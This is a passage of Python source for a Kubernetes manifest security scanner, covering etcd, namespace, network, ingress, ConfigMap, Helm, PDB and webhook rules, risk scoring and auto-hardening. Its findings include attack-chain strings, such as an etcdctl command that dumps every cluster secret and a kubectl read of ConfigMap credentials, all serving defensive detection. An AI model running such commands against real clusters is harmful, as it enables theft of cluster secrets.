    def F(rule_id, severity, title, description, attack_chain, fix_snippet, scenario_url, pattern=""):
            return _make_finding(rule_id, severity, title, description, attack_chain,
                                 fix_snippet, scenario_url, raw_lines, pattern,
                                 doc_start, doc_end, doc_idx, rkey)
    spec = doc.get("spec", {}) or {}
    for c in spec.get("containers", []):
        args_list = c.get("command", []) + c.get("args", [])
        args_str  = " ".join(str(a) for a in args_list)
        if "etcd" not in c.get("image", "") and "etcd" not in str(args_str):
            continue
        if "--cert-file" not in args_str and "--trusted-ca-file" not in args_str:
            if any("etcd" in str(a) for a in args_list):
                findings.append(F("ETCD001","CRITICAL","etcd running without TLS (HTTP)",
                    "etcd stores all cluster state including all Secrets. "
                    "Without TLS, all data is transmitted in plaintext — any network-adjacent "
                    "attacker can read every secret in the cluster.",
                    ["Attacker on same network segment",
                     "Connects to etcd port (2379) directly",
                     "ETCDCTL_API=3 etcdctl get / --prefix → dumps all cluster state and secrets"],
                    "# Add TLS flags to etcd:\n--cert-file=/etc/etcd/server.crt\n--key-file=/etc/etcd/server.key\n--trusted-ca-file=/etc/etcd/ca.crt\n--client-cert-auth=true",
                    S("etcd-exposure"), "etcd"))
        if "--listen-client-urls" in args_str:
            m = re.search(r"--listen-client-urls[= ]([^\s]+)", args_str)
            if m and "0.0.0.0" in m.group(1):
                findings.append(F("ETCD002","CRITICAL","etcd bound to 0.0.0.0 — publicly accessible",
                    "etcd is listening on all interfaces (0.0.0.0). "
                    "If the host has a public IP or is reachable from the internet, "
                    "the etcd API is exposed.",
                    ["etcd accessible from network",
                     "Attacker dumps all secrets without authentication"],
                    "--listen-client-urls=https://127.0.0.1:2379",
                    S("etcd-exposure"), "0.0.0.0"))
        if "--encryption-provider-config" not in args_str:
            findings.append(F("ETCD003","MEDIUM","Secrets not encrypted at rest in etcd",
                "Without --encryption-provider-config, Secrets are stored as base64 "
                "(not encrypted) in etcd. Anyone with etcd access reads them plaintext.",
                ["Attacker gets etcd snapshot or disk access",
                 "Decodes base64 → reads all Secrets in plaintext"],
                "# Add to kube-apiserver:\n--encryption-provider-config=/etc/kubernetes/encryption.yaml",
                S("etcd-exposure"), ""))
    return findings


def check_namespace(doc, raw_lines, doc_start, doc_end, doc_idx, rkey):
    findings = []
    # NS010/NS011 only apply to Namespace objects — not to every resource in a namespace
    if doc.get("kind") != "Namespace":
        return findings
    def F(rule_id, severity, title, description, attack_chain, fix_snippet, scenario_url, pattern=""):
            return _make_finding(rule_id, severity, title, description, attack_chain,
                                 fix_snippet, scenario_url, raw_lines, pattern,
                                 doc_start, doc_end, doc_idx, rkey)
    meta   = doc.get("metadata", {}) or {}
    labels = meta.get("labels", {}) or {}
    enforce = labels.get("pod-security.kubernetes.io/enforce", "")
    if not enforce:
        findings.append(F("NS010","HIGH","Namespace missing Pod Security Admission enforce label",
            "Without a PSA enforce label, Kubernetes does not restrict what pods can run in this namespace. "
            "Any pod spec — including privileged containers — will be admitted.",
            ["Attacker deploys privileged pod in namespace",
             "No admission control blocks it",
             "Container escape → node takeover"],
            "metadata:\n  labels:\n    pod-security.kubernetes.io/enforce: restricted\n    pod-security.kubernetes.io/audit: restricted\n    pod-security.kubernetes.io/warn: restricted",
            S("privileged-pod"), ""))
    elif enforce == "privileged":
        findings.append(F("NS011","HIGH","Namespace PSA enforce level is 'privileged'",
            "PSA enforce:privileged disables all pod security restrictions for this namespace. "
            "This is the equivalent of no policy — privileged pods, hostPath mounts, and root "
            "containers are all permitted.",
            ["Attacker deploys privileged pod in namespace",
             "PSA enforce:privileged → no restrictions apply",
             "Container escape → node takeover"],
            "metadata:\n  labels:\n    pod-security.kubernetes.io/enforce: restricted",
            S("privileged-pod"), "privileged"))
    return findings


def check_network_policy(doc, raw_lines, doc_start, doc_end, doc_idx, rkey):
    findings = []
    def F(rule_id, severity, title, description, attack_chain, fix_snippet, scenario_url, pattern=""):
            return _make_finding(rule_id, severity, title, description, attack_chain,
                                 fix_snippet, scenario_url, raw_lines, pattern,
                                 doc_start, doc_end, doc_idx, rkey)
    spec = doc.get("spec", {}) or {}
    pt   = spec.get("podSelector", {})
    policy_types = spec.get("policyTypes", [])
    ingress_rules = spec.get("ingress", [])
    egress_rules  = spec.get("egress", [])

    # Catch-all ingress (open to all)
    for rule in ingress_rules:
        if rule is None or rule == {}:
            findings.append(F("NET002","MEDIUM","NetworkPolicy has catch-all ingress (allows all sources)",
                "An empty ingress rule {} allows traffic from any source — "
                "negating the intent of having a NetworkPolicy.",
                ["NetworkPolicy exists but ingress is {} (allow-all)",
                 "Any pod in cluster can reach this workload",
                 "East-west movement unrestricted"],
                "# Specify explicit ingress sources:\ningress:\n- from:\n  - podSelector:\n      matchLabels:\n        app: frontend",
                S("ssrf-metadata"), ""))

    # No egress restriction
    if "Egress" not in policy_types and policy_types:
        findings.append(F("NET003","MEDIUM","NetworkPolicy has no Egress restriction",
            "This NetworkPolicy controls ingress but not egress. "
            "A compromised pod can freely make outbound connections — to cloud metadata APIs, "
            "internal services, or external C2 infrastructure.",
            ["Compromised pod makes outbound connection to attacker C2",
             "Or: queries cloud metadata API → cloud credentials",
             "Or: reaches internal services not exposed via ingress"],
            "# Add egress restriction:\nspec:\n  policyTypes:\n  - Ingress\n  - Egress\n  egress:\n  - to:\n    - podSelector:\n        matchLabels:\n          app: backend\n    ports:\n    - port: 8080",
            S("ssrf-metadata"), ""))
    return findings


def check_workload_for_net_policy(doc, all_docs, raw_lines, doc_start, doc_end, doc_idx, rkey):
    """Check if a workload has a corresponding NetworkPolicy."""
    findings = []
    def F(rule_id, severity, title, description, attack_chain, fix_snippet, scenario_url, pattern=""):
            return _make_finding(rule_id, severity, title, description, attack_chain,
                                 fix_snippet, scenario_url, raw_lines, pattern,
                                 doc_start, doc_end, doc_idx, rkey)
    kind = doc.get("kind", "")
    if kind not in ("Pod", "Deployment", "DaemonSet", "StatefulSet", "ReplicaSet"):
        return findings
    meta   = doc.get("metadata", {}) or {}
    labels = meta.get("labels", {}) or {}
    ns     = meta.get("namespace", "default")
    if not labels:
        return findings
    # Check if any NetworkPolicy in same namespace selects this workload
    for other in all_docs:
        if not isinstance(other, dict):
            continue
        if other.get("kind") != "NetworkPolicy":
            continue
        other_ns = (other.get("metadata") or {}).get("namespace", "default")
        if other_ns != ns:
            continue
        selector = (other.get("spec") or {}).get("podSelector", {}) or {}
        match_labels = selector.get("matchLabels", {}) or {}
        if not match_labels:
            continue
        if all(labels.get(k) == v for k, v in match_labels.items()):
            return findings  # covered
    findings.append(F("NET001","MEDIUM",
        f"No NetworkPolicy covers {kind}/{meta.get('name','?')}",
        "No NetworkPolicy selects this workload. All pod-to-pod traffic is permitted by default. "
        "A compromised pod in any namespace can reach this workload on any port.",
        ["Attacker compromises any pod in cluster",
         "No NetworkPolicy restricts east-west traffic",
         "Direct access to this workload's ports"],
        f"# Create a NetworkPolicy:\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: {meta.get('name','myapp')}-netpol\nspec:\n  podSelector:\n    matchLabels:\n      app: {labels.get('app', meta.get('name','myapp'))}\n  policyTypes:\n  - Ingress\n  - Egress",
        S("ssrf-metadata"), ""))
    return findings


def check_ingress(doc, raw_lines, doc_start, doc_end, doc_idx, rkey):
    findings = []
    def F(rule_id, severity, title, description, attack_chain, fix_snippet, scenario_url, pattern=""):
            return _make_finding(rule_id, severity, title, description, attack_chain,
                                 fix_snippet, scenario_url, raw_lines, pattern,
                                 doc_start, doc_end, doc_idx, rkey)
    spec = doc.get("spec", {}) or {}
    meta = doc.get("metadata", {}) or {}
    annotations = meta.get("annotations", {}) or {}

    for rule in spec.get("rules", []):
        host = rule.get("host", "")
        if not host or host in ("*", ""):
            findings.append(F("ING002","MEDIUM","Ingress wildcard/missing host",
                "An ingress rule without a specific host matches any request not matched by other rules. "
                "This can expose backend services to unexpected traffic.",
                ["Request to any hostname hits this ingress",
                 "Backend service receives unexpected traffic"],
                "spec:\n  rules:\n  - host: myapp.example.com  # specify explicit host",
                S("dashboard-chain"), ""))
        else:
            # Check TLS for this host
            tls_hosts = [h for t in spec.get("tls", []) for h in t.get("hosts", [])]
            if host not in tls_hosts:
                findings.append(F("ING001","MEDIUM",f"Ingress host '{host}' has no TLS",
                    f"The host '{host}' is not covered by a TLS entry. "
                    "Traffic is served over plaintext HTTP — credentials, session tokens, "
                    "and data are exposed to network sniffing.",
                    ["User sends credentials over HTTP",
                     "Attacker on network intercepts plaintext traffic",
                     "Credentials captured"],
                    f"spec:\n  tls:\n  - hosts:\n    - {host}\n    secretName: {host.replace('.', '-')}-tls",
                    S("ssrf-metadata"), host))

    AUTH_ANNOTATIONS = {
        "nginx.ingress.kubernetes.io/auth-type",
        "nginx.ingress.kubernetes.io/auth-url",
        "nginx.ingress.kubernetes.io/auth-signin",
        "alb.ingress.kubernetes.io/auth-type",
        "kubernetes.io/ingress.class",
    }
    has_auth = any(k in AUTH_ANNOTATIONS for k in annotations)
    if not has_auth and spec.get("rules"):
        findings.append(F("ING003","LOW","Ingress has no authentication annotation",
            "No auth annotation detected. Ingress is serving traffic without enforcing authentication. "
            "Depending on the backend, this may expose unauthenticated endpoints.",
            ["Ingress serves unauthenticated traffic to backend"],
            "metadata:\n  annotations:\n    nginx.ingress.kubernetes.io/auth-type: basic\n    nginx.ingress.kubernetes.io/auth-secret: basic-auth",
            S("dashboard-chain"), ""))
    return findings


def check_configmap(doc, raw_lines, doc_start, doc_end, doc_idx, rkey):
    findings = []
    def F(rule_id, severity, title, description, attack_chain, fix_snippet, scenario_url, pattern=""):
            return _make_finding(rule_id, severity, title, description, attack_chain,
                                 fix_snippet, scenario_url, raw_lines, pattern,
                                 doc_start, doc_end, doc_idx, rkey)
    for key, value in (doc.get("data") or {}).items():
        # Pattern-based detection (ENV004) — matches on value content
        pat_match = _detect_secret_pattern(str(value)) if value else None
        if pat_match:
            pat_name, pat_sev = pat_match
            masked = str(value)[:6] + "***" if len(str(value)) > 6 else "***"
            findings.append(F("ENV004", pat_sev,
                f"{pat_name} detected in ConfigMap: {key}={masked}",
                f"The ConfigMap key '{key}' contains what appears to be a real {pat_name}. "
                "ConfigMaps are not encrypted and are readable by any principal with ConfigMap "
                "read access. They are often included in cluster backups without redaction.",
                ["Attacker reads ConfigMap: kubectl get configmap -o yaml",
                 f"Extracts {pat_name} in plaintext",
                 "Uses credential to access external service — no K8s RBAC required"],
                f"# Move to a Secret instead:\napiVersion: v1\nkind: Secret\nmetadata:\n  name: app-secrets\nstringData:\n  {key}: <value>",
                S("secrets-exfil"), key))
        elif _looks_like_credential(key, value):
            masked = str(value)[:4] + "***" if len(str(value)) > 4 else "***"
            findings.append(F("ENV002","HIGH",
                f"Credential in ConfigMap: {key}={masked}",
                f"ConfigMaps are not encrypted. The key '{key}' appears to contain a credential. "
                "ConfigMaps are visible to any principal with ConfigMap read access and are often "
                "included in cluster backups without redaction.",
                ["Attacker reads ConfigMap",
                 "Extracts plaintext credential",
                 "Uses credential to access database, API, or other service"],
                f"# Move to a Secret instead:\napiVersion: v1\nkind: Secret\nmetadata:\n  name: app-secrets\nstringData:\n  {key}: <value>",
                S("secrets-exfil"), key))
    return findings


# ─────────────────────────────────────────────────────────────
# NEW RULES v0.4.0
# ─────────────────────────────────────────────────────────────

def check_helm_values(doc, raw_lines, doc_start, doc_end, doc_idx, rkey):
    """Check Helm values.yaml for secrets and insecure defaults."""
    findings = []
    def F(rule_id, severity, title, description, attack_chain, fix_snippet, scenario_url, pattern=""):
            return _make_finding(rule_id, severity, title, description, attack_chain,
                                 fix_snippet, scenario_url, raw_lines, pattern,
                                 doc_start, doc_end, doc_idx, rkey)
    # Flatten the entire document looking for credential-like keys
    def _walk(obj, path=""):
        if isinstance(obj, dict):
            for k, v in obj.items():
                _walk(v, f"{path}.{k}" if path else k)
        elif isinstance(obj, list):
            for i, item in enumerate(obj):
                _walk(item, f"{path}[{i}]")
        elif isinstance(obj, str):
            # Check if any segment of path looks like a cred key
            key_name = path.split(".")[-1].split("[")[0]
            if _looks_like_credential(key_name, obj):
                masked = obj[:4] + "***" if len(obj) > 4 else "***"
                findings.append(F("HLM001","HIGH",
                    f"Hardcoded secret in Helm values: {path}={masked}",
                    f"The Helm values key '{path}' appears to contain a hardcoded secret. "
                    "values.yaml is committed to source control and distributed with the chart — "
                    "never put real secrets here.",
                    ["Helm chart committed to repo with real credentials",
                     "Anyone with repo access has the secret",
                     "Secret appears in helm get values output and CI logs"],
                    f"# Use --set or external secrets at deploy time:\nhelm install myapp ./chart --set {path}=$SECRET_VALUE\n# Or use a Secrets provider (External Secrets Operator, Vault)",
                    S("secrets-exfil"), key_name))
        # Check for insecure Helm defaults
        if isinstance(obj, dict):
            auth = obj.get("auth", {}) or {}
            if isinstance(auth, dict):
                if auth.get("enabled") is False:
                    findings.append(F("HLM002","HIGH",
                        f"Helm chart has auth.enabled: false",
                        "Authentication is explicitly disabled in this Helm chart. "
                        "This is a common misconfiguration in Bitnami/Helm charts for databases and message brokers.",
                        ["Service deployed with no authentication",
                         "Attacker on same network connects without credentials"],
                        "auth:\n  enabled: true",
                        S("etcd-exposure"), "auth.enabled"))
    _walk(doc)
    return findings


def check_pdb(doc, all_docs, raw_lines, doc_start, doc_end, doc_idx, rkey):
    """Check for PodDisruptionBudget gaps and single-replica availability risks."""
    findings = []
    def F(rule_id, severity, title, description, attack_chain, fix_snippet, scenario_url, pattern=""):
            return _make_finding(rule_id, severity, title, description, attack_chain,
                                 fix_snippet, scenario_url, raw_lines, pattern,
                                 doc_start, doc_end, doc_idx, rkey)
    kind = doc.get("kind", "")
    if kind not in ("Deployment", "StatefulSet"):
        return findings
    meta     = doc.get("metadata", {}) or {}
    name     = meta.get("name", "?")
    ns       = meta.get("namespace", "default")
    replicas = (doc.get("spec") or {}).get("replicas", 1)
    labels   = ((doc.get("spec") or {}).get("template", {}).get("metadata") or {}).get("labels", {}) or {}

    # Check for matching PDB
    has_pdb = False
    for other in all_docs:
        if not isinstance(other, dict) or other.get("kind") != "PodDisruptionBudget":
            continue
        other_ns = (other.get("metadata") or {}).get("namespace", "default")
        if other_ns != ns:
            continue
        sel = (other.get("spec") or {}).get("selector", {}) or {}
        match_labels = sel.get("matchLabels", {}) or {}
        if match_labels and all(labels.get(k) == v for k, v in match_labels.items()):
            has_pdb = True
            break

    if replicas == 1:
        findings.append(F("PDB001","MEDIUM",
            f"{kind}/{name} has replicas:1 — single point of failure",
            f"This {kind} runs a single replica. A node drain, eviction, or update will cause "
            "downtime. An attacker triggering a pod eviction (e.g. via resource exhaustion) can "
            "cause a denial of service.",
            ["Attacker triggers resource pressure on node",
             "Pod evicted — single replica means service is down",
             "Or: rolling update with maxUnavailable:1 takes service offline"],
            f"spec:\n  replicas: 3  # minimum for HA\n---\napiVersion: policy/v1\nkind: PodDisruptionBudget\nmetadata:\n  name: {name}-pdb\nspec:\n  minAvailable: 2\n  selector:\n    matchLabels:\n      app: {labels.get('app', name)}",
            "", "replicas: 1"))

    if not has_pdb and replicas and replicas > 1:
        findings.append(F("PDB002","LOW",
            f"{kind}/{name} has no PodDisruptionBudget",
            f"No PDB found for {kind}/{name}. Without a PDB, a cluster upgrade or node drain can "
            "evict all replicas simultaneously — causing complete service outage.",
            ["Cluster admin drains node for maintenance",
             "All replicas scheduled on that node evicted simultaneously",
             "Service is completely down during drain"],
            f"apiVersion: policy/v1\nkind: PodDisruptionBudget\nmetadata:\n  name: {name}-pdb\nspec:\n  minAvailable: 1  # or maxUnavailable: 1\n  selector:\n    matchLabels:\n      app: {labels.get('app', name)}",
            "", ""))
    return findings


def check_admission_webhook(doc, raw_lines, doc_start, doc_end, doc_idx, rkey):
    """Check for dangerous admission webhook configurations."""
    findings = []
    def F(rule_id, severity, title, description, attack_chain, fix_snippet, scenario_url, pattern=""):
            return _make_finding(rule_id, severity, title, description, attack_chain,
                                 fix_snippet, scenario_url, raw_lines, pattern,
                                 doc_start, doc_end, doc_idx, rkey)
    kind = doc.get("kind", "")
    if kind not in ("ValidatingWebhookConfiguration", "MutatingWebhookConfiguration"):
        return findings

    for webhook in (doc.get("webhooks") or []):
        name   = webhook.get("name", "?")
        policy = webhook.get("failurePolicy", "Fail")
        timeout = webhook.get("timeoutSeconds", 10)

        if policy == "Ignore":
            findings.append(F("WHK001","HIGH",
                f"Admission webhook '{name}' has failurePolicy:Ignore",
                "failurePolicy:Ignore means if the webhook is unavailable or returns an error, "
                "the API request is admitted anyway. A security webhook with Ignore policy can be "
                "bypassed by taking down the webhook service.",
                ["Attacker deploys malicious pod",
                 "Webhook service taken down (or overwhelmed)",
                 "With failurePolicy:Ignore — pod admitted without security check",
                 "Privileged pod runs without being blocked"],
                f"# In webhook '{name}':\nfailurePolicy: Fail  # reject requests if webhook unavailable",
                S("supply-chain"), "Ignore"))

        if timeout > 15:
            findings.append(F("WHK002","LOW",
                f"Admission webhook '{name}' has high timeout ({timeout}s)",
                f"A webhook timeout of {timeout}s can cause API server latency. "
                "Under high load, slow webhooks degrade cluster control plane responsiveness.",
                ["High load on API server",
                 f"Webhook takes {timeout}s to respond",
                 "API requests queue up — control plane degraded"],
                f"timeoutSeconds: 10  # recommended max for '{name}'",
                "", f"timeoutSeconds: {timeout}"))

        # Check for wildcards that match all resources (over-broad)
        for rule in (webhook.get("rules") or []):
            resources  = rule.get("resources", [])
            operations = rule.get("operations", [])
            if "*" in resources and "*" in operations:
                findings.append(F("WHK003","MEDIUM",
                    f"Admission webhook '{name}' intercepts all resources and operations",
                    "A webhook that intercepts all resources and all operations is a "
                    "performance risk and a single point of failure for the entire cluster.",
                    ["Every API operation goes through this webhook",
                     "Webhook slowness or failure affects all cluster operations",
                     "Potential for data exfiltration of all applied manifests"],
                    f"# Narrow the scope of '{name}':\nrules:\n- apiGroups: [\"\"]\n  resources: [\"pods\"]\n  operations: [\"CREATE\"]",
                    "", ""))
    return findings


# ─────────────────────────────────────────────────────────────
# MAIN SCANNER
# ─────────────────────────────────────────────────────────────
ALL_RULES = [
    check_etcd, check_namespace, check_ingress, check_configmap,
    check_services, check_rbac, check_network_policy,
    check_admission_webhook,
]


def scan_yaml_string(content: str, filename: str = "<input>") -> list[Finding]:
    raw_lines = content.splitlines()
    boundaries = _doc_boundaries(raw_lines)
    parts = re.split(r"^---\s*$", content, flags=re.MULTILINE)
    parts = [p for p in parts if p.strip()]

    all_docs = []
    for part in parts:
        try:
            d = yaml.safe_load(part)
            if isinstance(d, dict):
                all_docs.append(d)
        except Exception:
            pass

    findings = []
    for doc_idx, (part, (doc_start, doc_end)) in enumerate(
            zip(parts, boundaries[:len(parts)])):
        if not part.strip():
            continue
        try:
            doc = yaml.safe_load(part)
        except yaml.YAMLError:
            continue
        if not isinstance(doc, dict):
            continue

        kind = doc.get("kind", "")

        # kubectl -o yaml wraps results in a List — unwrap and process each item
        if kind.endswith("List") and "items" in doc:
            for item in (doc.get("items") or []):
                if not isinstance(item, dict):
                    continue
                item_rkey = _resource_key(item)
                item_kind = item.get("kind", "")
                for rule_fn in ALL_RULES:
                    findings.extend(rule_fn(item, raw_lines, doc_start, doc_end, doc_idx, item_rkey))
                item_spec = None
                if item_kind == "Pod":
                    item_spec = item.get("spec")
                elif item_kind in ("Deployment","DaemonSet","StatefulSet","ReplicaSet"):
                    item_spec = (item.get("spec") or {}).get("template", {}).get("spec")
                elif item_kind == "Job":
                    item_spec = (item.get("spec") or {}).get("template", {}).get("spec")
                elif item_kind == "CronJob":
                    item_spec = ((item.get("spec") or {}).get("jobTemplate", {})
                                 .get("spec", {}).get("template", {}).get("spec"))
                if item_spec and isinstance(item_spec, dict):
                    findings.extend(check_pod_spec(item_spec, raw_lines, doc_start, doc_end, doc_idx, item_rkey))
                    findings.extend(check_workload_for_net_policy(item, all_docs, raw_lines, doc_start, doc_end, doc_idx, item_rkey))
                if item_kind in ("Deployment", "StatefulSet"):
                    findings.extend(check_pdb(item, all_docs, raw_lines, doc_start, doc_end, doc_idx, item_rkey))
                if not item_kind and any(k in item for k in ("image","service","ingress","replicaCount","auth")):
                    findings.extend(check_helm_values(item, raw_lines, doc_start, doc_end, doc_idx, item_rkey))
            continue  # skip the normal per-doc processing below

        rkey = _resource_key(doc)

        for rule_fn in ALL_RULES:
            findings.extend(rule_fn(doc, raw_lines, doc_start, doc_end, doc_idx, rkey))

        # Pod spec checks (works for Pod, Deployment, DaemonSet, etc.)
        spec = None
        if kind == "Pod":
            spec = doc.get("spec")
        elif kind in ("Deployment", "DaemonSet", "StatefulSet", "ReplicaSet"):
            spec = (doc.get("spec") or {}).get("template", {}).get("spec")
        elif kind == "Job":
            spec = (doc.get("spec") or {}).get("template", {}).get("spec")
        elif kind == "CronJob":
            spec = ((doc.get("spec") or {}).get("jobTemplate", {})
                    .get("spec", {}).get("template", {}).get("spec"))

        if spec and isinstance(spec, dict):
            findings.extend(check_pod_spec(spec, raw_lines, doc_start, doc_end, doc_idx, rkey))
            findings.extend(check_workload_for_net_policy(doc, all_docs, raw_lines, doc_start, doc_end, doc_idx, rkey))

        # Helm values.yaml detection
        if not kind and any(k in doc for k in ("image","service","ingress","replicaCount","auth")):
            findings.extend(check_helm_values(doc, raw_lines, doc_start, doc_end, doc_idx, rkey))

        # PDB check
        if kind in ("Deployment", "StatefulSet"):
            findings.extend(check_pdb(doc, all_docs, raw_lines, doc_start, doc_end, doc_idx, rkey))

    # Deduplicate (same rule_id + line_num + doc_idx)
    seen = set()
    deduped = []
    for f in findings:
        key = (f.rule_id, f.line_num, f.doc_index, f.resource_key)
        if key not in seen:
            seen.add(key)
            deduped.append(f)

    deduped.sort(key=lambda f: (SEV_ORDER.get(f.severity, 5), f.doc_index, f.line_num or 9999))
    return deduped


# ─────────────────────────────────────────────────────────────
# RISK SCORING
# ─────────────────────────────────────────────────────────────
COMBO_BONUSES = [
    ({"SC001", "SA001"},   15, "Privileged pod + SA token = 2-command node escape"),
    ({"SC001", "RBAC001"}, 20, "Privileged pod + cluster-admin = instant full cluster"),
    ({"VOL001", "NS002"},  10, "hostPath + hostNetwork = node filesystem + network sniff"),
    ({"NS001", "CAP001_SYS_PTRACE"}, 12, "hostPID + SYS_PTRACE = dump memory of any process"),
    ({"ETCD001", "ETCD002"}, 20, "etcd HTTP + 0.0.0.0 = publicly readable cluster state"),
    ({"RBAC008", "RBAC001"}, 5, "RBAC write + cluster-admin binding = trivial persistence"),
    ({"ENV001", "SA001"},  8,  "Hardcoded credentials + SA token = double pivot"),
    ({"SC002", "SC005"},   8,  "root + allowPrivEsc = escalation chain amplified"),
    ({"ING001", "ENV001"}, 5,  "HTTP ingress + hardcoded creds = credential sniff risk"),
    ({"WHK001", "SC001"},  10, "Webhook bypass + privileged pod = unblocked container escape"),
    ({"PDB001", "NET001"},  5, "Single replica + no NetworkPolicy = easy denial-of-service"),
    ({"HLM001", "SA001"},   8, "Helm secret + SA token = credential + K8s API pivot"),
]


def compute_risk_score(findings: list[Finding]) -> dict:
    if not findings:
        return {"score": 0, "grade": "A", "label": "Clean",
                "explanation": "No findings.", "combos": []}

    rule_ids     = {f.rule_id for f in findings}
    rule_prefixes = {f.rule_id.split("_")[0] for f in findings}

    base = sum(SEV_WEIGHT.get(f.severity, 0) for f in findings)
    combos_triggered, bonus = [], 0
    for combo_rules, combo_bonus, combo_desc in COMBO_BONUSES:
        if all(r in rule_ids or r.split("_")[0] in rule_prefixes for r in combo_rules):
            bonus += combo_bonus
            combos_triggered.append((combo_desc, combo_bonus))

    raw   = base + bonus
    score = int(100 * (1 - math.exp(-raw / 80)))
    score = min(score, 100)

    if score >= 85:   grade, label = "F",  "Critical Risk"
    elif score >= 65: grade, label = "D",  "High Risk"
    elif score >= 45: grade, label = "C",  "Elevated Risk"
    elif score >= 25: grade, label = "B",  "Moderate Risk"
    elif score >= 5:  grade, label = "B+", "Low Risk"
    else:             grade, label = "A",  "Minimal Risk"

    counts      = {s: sum(1 for f in findings if f.severity == s) for s in SEV_ORDER}
    explanation = (f"{counts.get('CRITICAL',0)}C / {counts.get('HIGH',0)}H / "
                   f"{counts.get('MEDIUM',0)}M / {counts.get('LOW',0)}L findings")
    if combos_triggered:
        explanation += f" + {len(combos_triggered)} dangerous combination(s)"

    return {"score": score, "grade": grade, "label": label,
            "explanation": explanation, "combos": combos_triggered,
            "base_raw": base, "bonus_raw": bonus}


def render_risk_score(risk: dict):
    score = risk["score"]
    grade = risk["grade"]
    label = risk["label"]
    if score >= 85:   score_color, bar_fill = "bold red",    "red"
    elif score >= 65: score_color, bar_fill = "bold yellow", "yellow"
    elif score >= 45: score_color, bar_fill = "bold cyan",   "cyan"
    elif score >= 5:  score_color, bar_fill = "dim white",   "white"
    else:             score_color, bar_fill = "bold green",  "green"
    BAR_WIDTH = 30
    filled    = int(score / 100 * BAR_WIDTH)
    bar       = f"[{bar_fill}]{'█' * filled}[/{bar_fill}][dim]{'░' * (BAR_WIDTH - filled)}[/dim]"
    console.print()
    console.print(f"  [dim]Risk Score[/dim]  [{score_color}]{score:>3}/100  {grade}  {label}[/{score_color}]  {bar}")
    console.print(f"  [dim]{risk['explanation']}[/dim]")
    if risk["combos"]:
        console.print()
        console.print("  [dim]⚡ Dangerous combinations detected:[/dim]")
        for desc, pts in risk["combos"]:
            console.print(f"    [bold red]+{pts:>2}[/bold red] [dim]{desc}[/dim]")


# ─────────────────────────────────────────────────────────────
# YAML-AWARE REMEDIATION ENGINE
# ─────────────────────────────────────────────────────────────
def _harden_container_sc(sc: dict) -> dict:
    sc = copy.deepcopy(sc)
    sc.pop("privileged", None)
    sc.setdefault("runAsNonRoot", True)
    if sc.get("runAsUser") == 0: sc["runAsUser"] = 1000
    sc.setdefault("runAsUser", 1000); sc.setdefault("runAsGroup", 1000)
    sc["allowPrivilegeEscalation"] = False
    sc.setdefault("readOnlyRootFilesystem", True)
    STRIP = {"SYS_ADMIN","SYS_MODULE","SYS_RAWIO","SYS_PTRACE","NET_ADMIN",
             "DAC_OVERRIDE","SETUID","SETGID","NET_RAW","CHOWN","FSETID","KILL"}
    caps = sc.setdefault("capabilities", {})
    safe_add = [c for c in caps.get("add", []) if c.upper() not in STRIP]
    caps["drop"] = ["ALL"]
    if safe_add: caps["add"] = safe_add
    elif "add" in caps: del caps["add"]
    sc.setdefault("seccompProfile", {"type": "RuntimeDefault"})
    return sc

def _harden_pod_sc(pod_sc: dict) -> dict:
    pod_sc = copy.deepcopy(pod_sc)
    pod_sc.setdefault("runAsNonRoot", True)
    pod_sc.setdefault("runAsUser", 1000); pod_sc.setdefault("runAsGroup", 1000)
    pod_sc.setdefault("seccompProfile", {"type": "RuntimeDefault"})
    return pod_sc

def _harden_resources(res: dict) -> dict:
    res  = copy.deepcopy(res)
    lims = res.setdefault("limits", {});   reqs = res.setdefault("requests", {})
    lims.setdefault("cpu","500m");         lims.setdefault("memory","256Mi")
    reqs.setdefault("cpu","100m");         reqs.setdefault("memory","128Mi")
    return res

def _fix_volumes(volumes: list) -> list:
    DANGEROUS = {"/","/etc","/proc","/sys","/dev","/var/lib/kubelet","/etc/kubernetes"}
    out = []
    for vol in volumes:
        vol  = copy.deepcopy(vol)
        path = vol.get("hostPath", {}).get("path", "")
        if path in DANGEROUS or any(path.startswith(p+"/") for p in DANGEROUS):
            del vol["hostPath"]; vol["emptyDir"] = {}
            vol["_note"] = f"hostPath '{path}' replaced with emptyDir — verify app compatibility"
        out.append(vol)
    return out

def _fix_image(image: str) -> str:
    if "@sha256:" in image: return image
    if image.endswith(":latest"): return f"{image[:-7]}:stable"
    name_part = image.split("/")[-1]
    if ":" not in name_part: return f"{image}:stable"
    return image

def _fix_pod_spec(spec: dict) -> dict:
    spec = copy.deepcopy(spec)
    for field in ("hostPID","hostNetwork","hostIPC"):
        if spec.get(field): spec[field] = False
    spec["automountServiceAccountToken"] = False
    if spec.get("serviceAccountName","default") == "default":
        spec["serviceAccountName"] = "FIXME-create-dedicated-sa"
    spec["securityContext"] = _harden_pod_sc(spec.get("securityContext", {}))
    if "volumes" in spec: spec["volumes"] = _fix_volumes(spec["volumes"])
    for ckey in ("containers","initContainers","ephemeralContainers"):
        for c in spec.get(ckey, []):
            c["securityContext"] = _harden_container_sc(c.get("securityContext", {}))
            c["resources"]       = _harden_resources(c.get("resources", {}))
            if "image" in c: c["image"] = _fix_image(c["image"])
    return spec

def _fix_workload(doc: dict) -> dict:
    doc  = copy.deepcopy(doc)
    kind = doc.get("kind", "")
    if kind == "Pod":
        doc["spec"] = _fix_pod_spec(doc.get("spec", {}))
    elif kind in ("Deployment","DaemonSet","StatefulSet","ReplicaSet"):
        t = doc.setdefault("spec", {}).setdefault("template", {})
        t["spec"] = _fix_pod_spec(t.get("spec", {}))
    elif kind == "Job":
        t = doc.setdefault("spec", {}).setdefault("template", {})
        t["spec"] = _fix_pod_spec(t.get("spec", {}))
    elif kind == "CronJob":
        t = (doc.setdefault("spec", {}).setdefault("jobTemplate", {})
                .setdefault("spec", {}).setdefault("template", {}))
        t["spec"] = _fix_pod_spec(t.get("spec", {}))
    return doc

def _fix_service(doc: dict) -> dict:
    doc  = copy.deepcopy(doc)
    spec = doc.get("spec", {})
    if spec.get("type") == "LoadBalancer": spec["type"] = "ClusterIP"
    spec.pop("externalIPs", None); doc["spec"] = spec
    return doc

def _fix_rbac_role(doc: dict) -> dict:
    doc = copy.deepcopy(doc)
    for rule in doc.get("rules", []):
        if "*" in rule.get("verbs", []):
            rule["verbs"] = ["get","list","watch"]
            rule["_note"] = "verbs:[*] narrowed to read-only — add specific write verbs only if required"
        if "*" in rule.get("resources", []):
            rule["resources"] = ["FIXME-list-specific-resources"]
            rule.setdefault("_note", "resources:[*] replaced — enumerate only what's needed")
    return doc

def _fix_namespace(doc: dict) -> dict:
